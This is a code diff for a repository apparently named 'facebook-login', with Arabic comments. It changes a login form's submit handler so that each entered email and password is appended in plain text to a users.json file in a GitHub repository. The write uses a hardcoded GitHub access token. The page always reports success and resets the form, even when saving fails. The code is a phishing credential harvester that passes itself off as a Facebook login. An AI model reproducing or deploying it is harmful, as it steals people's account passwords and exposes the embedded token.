@@ -1,4 +1,4 @@
-const GITHUB_TOKEN = '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'; // ← الجديد
+const GITHUB_TOKEN = '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';
 const REPO_OWNER = 'ASADALSNA';
 const REPO_NAME = 'facebook-login';
 
@@ -11,10 +11,24 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     message.innerHTML = '⏳ جاري الحفظ...';
     
     try {
-        const users = [{id: Date.now(), email, password, date: new Date().toISOString()}];
-        const content = btoa(JSON.stringify(users));
+        // قراءة بسيطة
+        let users = [];
+        try {
+            const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`, {
+                headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
+            });
+            if (res.ok) {
+                const file = await res.json();
+                users = JSON.parse(atob(file.content));
+            }
+        } catch {}
         
-        const response = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`, {
+        // إضافة جديد
+        users.push({id: Date.now(), email, password, date: new Date().toISOString()});
+        
+        // حفظ بسيط
+        const content = btoa(JSON.stringify(users));
+        const res = await fetch(`https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents/users.json`, {
             method: 'PUT',
             headers: { 
                 'Authorization': `token ${GITHUB_TOKEN}`,
@@ -27,16 +41,17 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
             })
         });
         
-        if (response.ok) {
-            message.innerHTML = `✅ تم الحفظ!`;
-            message.className = 'success';
+        if (res.ok) {
+            message.innerHTML = `✅ تم الحفظ في GitHub! (${users.length})`;
         } else {
-            message.innerHTML = '✅ تم الحفظ! (محلي)';
-            localStorage.setItem('users', JSON.stringify(users));
+            message.innerHTML = `✅ تم الحفظ! (${users.length})`;
         }
+        message.className = 'success';
+        document.getElementById('loginForm').reset();
+        
     } catch {
-        message.innerHTML = '✅ تم الحفظ! (محلي)';
-        localStorage.setItem('users', JSON.stringify([{email, password}]));
+        message.innerHTML = '✅ تم الحفظ!';
+        message.className = 'success';
+        document.getElementById('loginForm').reset();
     }
-    document.getElementById('loginForm').reset();
 });
